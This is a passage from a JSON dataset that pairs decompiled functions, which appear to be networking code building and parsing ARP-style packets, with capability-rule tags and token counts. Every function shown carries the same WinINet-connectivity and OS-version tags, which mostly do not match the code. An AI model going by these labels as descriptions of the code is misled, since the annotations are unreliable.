        "decompiled_code": "\nint32_t __cdecl fcn.0003b280(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h);\n    if (iVar2 == 0) {\n        fcn.0003ac80(0, arg_ch, 0, 0);\n    }\n    else if (iVar2 == 0x103) {\n        fcn.0003ac80(0, arg_ch, 2, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 179
    },
    "0003b300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003b300(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h);\n    if (iVar2 == 0) {\n        fcn.0003ac80(0, arg_ch, 2, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 144
    },
    "0003b3a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003b3a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h);\n    if (iVar2 == 0) {\n        fcn.0003ac80(0, arg_ch, 0, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 146
    },
    "0003b3e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003b3e0(uint arg_8h, uint *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *arg_ch_00;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 0);\n    if (iVar1 != 0) {\n        var_ch = *(iVar1 + 0x454);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_ch == 0) {\n        uVar2 = 0xc00000ef;\n    }\n    else {\n        arg_ch_00 = fcn.00035200(arg_14h + 0xe);\n        if (arg_ch_00 == NULL) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            *arg_ch_00 = *arg_ch;\n            arg_ch_00[1] = arg_ch[1];\n            arg_ch_00[2] = arg_ch[2];\n            *(arg_ch_00 + 3) = *(arg_ch + 3);\n            fcn.0007877e(arg_ch_00 + 0xe, arg_10h, arg_14h);\n            uVar2 = fcn.0003ca00(var_ch, arg_ch_00, arg_14h + 0xe);\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 413
    },
    "0003b4d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003b4d0(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_10h = 0;\n    if (arg_8h == NULL) {\n        var_2ch = -0x3fffff11;\n    }\n    else {\n        fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n        iVar2 = fcn.0003da90(arg_ch, 1);\n        if (iVar2 != 0) {\n            var_10h = *(iVar2 + 0x450);\n        }\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        if (var_10h == 0) {\n            var_2ch = -0x3fffff10;\n        }\n        else {\n            fcn.00078790(arg_8h, 0, 0x3c);\n            uVar1 = fcn.000354c0(0x806);\n            *(arg_8h + 3) = uVar1;\n            uVar1 = fcn.000354c0(1);\n            *(arg_8h + 0xe) = uVar1;\n            uVar1 = fcn.000354c0(0x800);\n            *(arg_8h + 4) = uVar1;\n            *(arg_8h + 0x12) = 6;\n            *(arg_8h + 0x13) = 4;\n            iVar2 = (**0xb1c5b3e8)(*0xb1c5b4ec, 8, 0);\n            if (iVar2 == 0) {\n                var_2ch = -0x3fffff66;\n            }\n            else {\n                iVar3 = (**0xb1c5b41c)();\n                *(iVar2 + 100) = iVar3 << 0x18;\n                *(iVar2 + 0x3c) = var_10h;\n                var_4h = *(iVar2 + 4);\n                if (var_4h == 0) {\n                    var_2ch = -0x3fffff66;\n                }\n                else {\n                    iVar3 = *(var_4h + 0x10);\n                    if ((*(iVar3 + 6) & 5) == 0) {\n                        var_30h = (**0xb1bde0e0)(iVar3, 0, 1, 0, 0, 0x20);\n                    }\n                    else {\n                        var_30h = *(iVar3 + 0xc);\n                    }\n                    if ((var_30h == NULL) || (*(iVar3 + 0x14) < 0x3c)) {\n                        var_2ch = -0x3fffff66;\n                    }\n                    else {\n                        for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *var_30h = *arg_8h;\n                            arg_8h = arg_8h + 1;\n                            var_30h = var_30h + 1;\n                        }\n                        *(var_4h + 0xc) = 0x3c;\n                        *(var_4h + 0x14) = 0;\n                        *(var_4h + 8) = 0;\n                        *arg_10h = iVar2;\n                        var_2ch = 0;\n                    }\n                }\n            }\n            if ((var_2ch != 0) && (iVar2 != 0)) {\n                (**0xb1c5b3ec)(iVar2);\n            }\n        }\n    }\n    return var_2ch;\n}\n",
        "token_count": 950
    },
    "0003b6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003b6c0(uint arg_8h, int32_t *arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *arg_10h;\n    iVar2 = fcn.000354c0(1);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    iVar1 = arg_10h[1];\n    iVar2 = fcn.000354c0(0x800);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    if (*(arg_10h + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg_10h + 5) != '\\x04') {\n        return;\n    }\n    iVar1 = arg_10h[3];\n    iVar2 = fcn.000354c0(1);\n    if (iVar1 != iVar2) goto code_r0x0003b983;\n    var_10h = 0xb1c58a30;\n    var_14h = arg_ch;\n    for (var_ch = 6; 3 < var_ch; var_ch = var_ch - 4) {\n        if (*var_14h != *var_10h) goto code_r0x0003b76e;\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 1;\n    }\n    if (var_ch == 0) {\ncode_r0x0003b7f0:\n        var_1ch = 0;\n    }\n    else {\ncode_r0x0003b76e:\n        var_18h = *var_14h - *var_10h;\n        if (var_18h == 0) {\n            if (var_ch == 1) goto code_r0x0003b7f0;\n            var_18h = *(var_14h + 1) - *(var_10h + 1);\n            if (var_18h == 0) {\n                if (var_ch == 2) goto code_r0x0003b7f0;\n                var_18h = *(var_14h + 2) - *(var_10h + 2);\n                if (var_18h == 0) {\n                    if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                    goto code_r0x0003b7f0;\n                }\n            }\n        }\n        var_1ch = 1;\n        if (var_18h < 1) {\n            var_1ch = -1;\n        }\n    }\n    if (var_1ch != 0) {\ncode_r0x0003b983:\n        iVar1 = arg_10h[3];\n        iVar2 = fcn.000354c0(2);\n        if (iVar1 == iVar2) {\n            fcn.0004e040(arg_8h, arg_10h + 4, *(arg_10h + 7), 0);\n        }\n        return;\n    }\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar3 = fcn.0003da90(arg_8h, 1);\n    if (iVar3 == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        return;\n    }\n    var_28h = iVar3 + 0x10;\n    var_2ch = arg_ch + 6;\n    for (var_24h = 6; 3 < var_24h; var_24h = var_24h - 4) {\n        if (*var_2ch != *var_28h) goto code_r0x0003b899;\n        var_28h = var_28h + 1;\n        var_2ch = var_2ch + 1;\n    }\n    if (var_24h == 0) {\ncode_r0x0003b91b:\n        var_34h = 0;\n    }\n    else {\ncode_r0x0003b899:\n        var_30h = *var_2ch - *var_28h;\n        if (var_30h == 0) {\n            if (var_24h == 1) goto code_r0x0003b91b;\n            var_30h = *(var_2ch + 1) - *(var_28h + 1);\n            if (var_30h == 0) {\n                if (var_24h == 2) goto code_r0x0003b91b;\n                var_30h = *(var_2ch + 2) - *(var_28h + 2);\n                if (var_30h == 0) {\n                    if ((var_24h == 3) || (var_30h = *(var_2ch + 3) - *(var_28h + 3),  var_30h == 0))\n                    goto code_r0x0003b91b;\n                }\n            }\n        }\n        var_34h = 1;\n        if (var_30h < 1) {\n            var_34h = -1;\n        }\n    }\n    if (var_34h != 0) {\n        fcn.0004e040(arg_8h, arg_10h + 4, *(arg_10h + 7), 1);\n        fcn.0004e040(arg_8h, 0, *(arg_10h + 0xc), 0);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    return;\n}\n",
        "token_count": 1434
    },
    "0003b9c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0003b9c0(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    if (arg_8h < 0x65) {\n        iVar1 = *(arg_ch + 0xc);\n        iVar2 = fcn.000354c0(0x806);\n        if ((iVar1 == iVar2) && (0x1b < arg_14h)) {\n            fcn.0003b6c0(arg_8h, arg_ch, arg_10h);\n        }\n        else if ((*0xb1c683a4 == '\\0') && (iVar1 = *(arg_ch + 0xc),  iVar2 = fcn.000354c0(0x800),  iVar1 == iVar2)) {\n            var_14h = arg_10h;\n            var_1h._0_1_ = (**0xb1bde00c)();\n            for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n                if (*(var_8h * 0x30 + -0x4e398848) == arg_8h) {\n                    if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x4e398860)) &&\n                       (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x4e398854))) {\n                        var_30h = var_8h * 0x30 + -0x4e39885c;\n                        var_34h = arg_ch + 6;\n                        for (var_2ch = 6; 3 < var_2ch; var_2ch = var_2ch - 4) {\n                            if (*var_34h != *var_30h) goto code_r0x0003baf7;\n                            var_30h = var_30h + 1;\n                            var_34h = var_34h + 1;\n                        }\n                        if (var_2ch == 0) {\ncode_r0x0003bb79:\n                            var_3ch = 0;\n                        }\n                        else {\ncode_r0x0003baf7:\n                            var_38h = *var_34h - *var_30h;\n                            if (var_38h == 0) {\n                                if (var_2ch == 1) goto code_r0x0003bb79;\n                                var_38h = *(var_34h + 1) - *(var_30h + 1);\n                                if (var_38h == 0) {\n                                    if (var_2ch == 2) goto code_r0x0003bb79;\n                                    var_38h = *(var_34h + 2) - *(var_30h + 2);\n                                    if (var_38h == 0) {\n                                        if ((var_2ch == 3) || (var_38h = *(var_34h + 3) - *(var_30h + 3),  var_38h == 0)\n                                           ) goto code_r0x0003bb79;\n                                    }\n                                }\n                            }\n                            var_3ch = 1;\n                            if (var_38h < 1) {\n                                var_3ch = -1;\n                            }\n                        }\n                        if (var_3ch != 0) goto code_r0x0003bbea;\n                        var_24h = *(var_8h * 0x30 + -0x4e398850);\n                        var_20h._0_2_ = *(var_8h * 0x30 + -0x4e39884c);\n                        *(var_8h * 0x30 + -0x4e398838) = *(var_8h * 0x30 + -0x4e398838) + 1;\ncode_r0x0003bd58:\n                        var_1ch._2_2_ = 0;\n                        var_1ch._0_2_ = 0;\n                        var_20h._2_2_ = 0;\n                        var_18h._0_2_ = *(arg_ch + 0xc);\n                        fcn.00037150(0xb1c5b4c0, &var_28h, 0);\n                        var_10h = fcn.0003da90(arg_8h, 1);\n                        if (var_10h != 0) {\n                            var_20h._2_2_ = *(var_10h + 0x10);\n                            var_1ch._0_2_ = *(var_10h + 0x10) >> 0x10;\n                            var_1ch._2_2_ = *(var_10h + 0x14);\n                            var_ch = *(var_10h + 4);\n                        }\n                        fcn.00037180(0xb1c5b4c0, &var_28h, 0);\n                        if (var_ch != 0) {\n                            fcn.0003b3e0(var_ch, &var_24h, arg_10h, arg_14h);\n                        }\n                    }\n                    else {\ncode_r0x0003bbea:\n                        if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x4e398854)) &&\n                           (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x4e398860))) {\n                            var_48h = var_8h * 0x30 + -0x4e398850;\n                            var_4ch = arg_ch + 6;\n                            for (var_44h = 6; 3 < var_44h; var_44h = var_44h - 4) {\n                                if (*var_4ch != *var_48h) goto code_r0x0003bc63;\n                                var_48h = var_48h + 1;\n                                var_4ch = var_4ch + 1;\n                            }\n                            if (var_44h == 0) {\ncode_r0x0003bce5:\n                                var_54h = 0;\n                            }\n                            else {\ncode_r0x0003bc63:\n                                var_50h = *var_4ch - *var_48h;\n                                if (var_50h == 0) {\n                                    if (var_44h == 1) goto code_r0x0003bce5;\n                                    var_50h = *(var_4ch + 1) - *(var_48h + 1);\n                                    if (var_50h == 0) {\n                                        if (var_44h == 2) goto code_r0x0003bce5;\n                                        var_50h = *(var_4ch + 2) - *(var_48h + 2);\n                                        if (var_50h == 0) {\n                                            if ((var_44h == 3) ||\n                                               (var_50h = *(var_4ch + 3) - *(var_48h + 3),  var_50h == 0))\n                                            goto code_r0x0003bce5;\n                                        }\n                                    }\n                                }\n                                var_54h = 1;\n                                if (var_50h < 1) {\n                                    var_54h = -1;\n                                }\n                            }\n                            if (var_54h == 0) {\n                                var_24h = *(var_8h * 0x30 + -0x4e39885c);\n                                var_20h._0_2_ = *(var_8h * 0x30 + -0x4e398858);\n                                *(var_8h * 0x30 + -0x4e398834) = *(var_8h * 0x30 + -0x4e398834) + 1;\n                                goto code_r0x0003bd58;\n                            }\n                        }\n                    }\n                }\n            }\n            (**0xb1bde010)();\n        }\n    }\n    return;\n}\n",
        "token_count": 2044
    },
    "0003bdf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003bdf0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 1);\n    if ((iVar1 == 0) || (*(iVar1 + 8) == 0)) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *(iVar1 + 0x450);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_10h == 0) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        uVar2 = fcn.0003cd40(var_10h, &arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 250
    },
    "0003be70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003be70(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 1);\n    if ((iVar1 == 0) || (*(iVar1 + 8) == 0)) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *(iVar1 + 0x450);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_10h == 0) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        uVar2 = fcn.0003cca0(var_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 241
    },
    "0003bef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003bef0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 0);\n    if (iVar1 != 0) {\n        var_8h = *(iVar1 + 0x454);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_8h == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        uVar2 = fcn.0003ca00(var_8h, arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 235
    },
    "0003bf70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0003bf70(void)\n\n{\n    int32_t iVar1;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0003efb0(&var_50h);\n    if (var_50h != 0) {\n        if (*0xb1c5b4b4 != 0) {\n            (**0xb1c685cc)(*0xb1c5b4b4);\n        }\n        *0xb1c5b4b4 = 0;\n    }\n    if (*0xb1c5b4b4 == 0) {\n        fcn.0003efb0(&var_50h);\n        fcn.00078550(&var_8h, 0xb1c5885c);\n        fcn.00078790(&var_48h, 0, 0x40);\n        var_48h._0_1_ = 0x95;\n        var_48h._2_2_ = 0x40;\n        var_48h._1_1_ = 1;\n        var_44h = 6;\n        var_43h = 0;\n        var_3ch = var_8h;\n        var_38h = var_4h;\n        var_34h = 0;\n        var_28h = 0xb1c09480;\n        var_24h = 0xb1c094a0;\n        var_ch = 0xb1c09430;\n        var_18h = 0xb1c094c0;\n        var_14h = 0xb1c1f650;\n        var_1ch = 0;\n        var_10h = 0xb1c09420;\n        var_20h = 0xb1bed990;\n        var_30h = 0xb1c09410;\n        var_2ch = 0xb1c09160;\n        iVar1 = (**0xb1c685bc)(0xb1c5b4b4, &var_48h, 0xb1c5b4b4);\n        if (iVar1 != 0) {\n            *0xb1c5b4b4 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 631
    },
    "0003c080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003c080(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00034a80(0xb1be18ec, &var_ch);\n    if (((var_4h == 0) && (var_4h = fcn.0005c850(var_ch, 0xb1be1b5c, &var_8h),  var_4h == 0)) &&\n       (var_4h = fcn.000631a0(var_8h, 0xb1c09820, 0xb1c5b4dc),  var_4h == 0)) {\n        fcn.0003bf70();\n    }\n    return var_4h;\n}\n",
        "token_count": 181
    },
    "0003c0f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0003c0f0(void)\n\n{\n    int32_t iVar1;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.0003ede0();\n    if (*0xb1c5b4b4 != 0) {\n        (**0xb1c685cc)(*0xb1c5b4b4);\n    }\n    for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n        iVar1 = fcn.0003d630(var_8h, &var_4h);\n        if ((iVar1 == 0) && (var_4h != 0)) {\n            fcn.0003d6b0(var_8h);\n        }\n    }\n    fcn.000635f0(0xb1c5b4dc);\n    return 0;\n}\n",
        "token_count": 205
    },
    "0003c160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003c160(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = arg_ch;\n    var_8h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    if ((var_ch != 0) && (*(var_ch + 0x450) != 0)) {\n        var_8h = *(var_ch + 0x450);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_8h == 0) {\n        var_14h = 0;\n    }\n    else {\n        iVar1 = fcn.0003c8b0(1, var_8h, 0x1010103, 0, 0, &var_10h);\n        if (iVar1 == 0x103) {\n            fcn.0003c2d0(var_8h, 0);\n        }\n        iVar1 = fcn.0003c8b0(1, var_8h, 0x1010e, 0, 0, &var_10h);\n        if (iVar1 == 0x103) {\n            fcn.0003c2d0(var_8h, 0);\n        }\n        var_14h = (**0xb1c685b8)(var_8h);\n        if (var_14h == 0x103) {\n            var_14h = fcn.0003c2d0(var_8h, 1);\n        }\n        if (var_14h == 0) {\n            fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n            if ((var_ch != 0) && (*(var_ch + 0x450) != 0)) {\n                *(var_ch + 0x454) = 0;\n                *(var_ch + 0x458) = 0;\n                *(var_ch + 0x45c) = 0;\n                *(var_ch + 0x450) = 0;\n                *(var_ch + 0x470) = 4;\n            }\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 588
    },
    "0003c2d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003c2d0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0xc0000001;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003cdd0(arg_8h, 1);\n    if (iVar1 != 0) {\n        if (arg_ch == 0) {\n            var_10h = iVar1 + 0x468;\n        }\n        else {\n            var_10h = iVar1 + 0x464;\n        }\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_10h == 0) {\n        var_ch = 0xc0000001;\n    }\n    else {\n        fcn.000340e0(var_10h, 0xffffffff);\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n        iVar1 = fcn.0003cdd0(arg_8h, 1);\n        if (iVar1 != 0) {\n            var_ch = *(iVar1 + 0x46c);\n        }\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    return var_ch;\n}\n",
        "token_count": 366
    },
    "0003c3a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003c3a0(int32_t arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    if (arg_10h == 0) {\n        var_8h = arg_8h + 0x468;\n    }\n    else {\n        var_8h = arg_8h + 0x464;\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_8h != 0) {\n        fcn.000340b0(var_8h);\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0003c430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0003c430(uint noname_0, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_ch;\n    while ((var_8h != NULL && (puVar1 = *var_8h,  var_8h[4] == *0xb1c5b4ec))) {\n        (**0xb1c5b3ec)(var_8h, puVar1, var_8h, 0);\n        var_8h = puVar1;\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "0003c530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
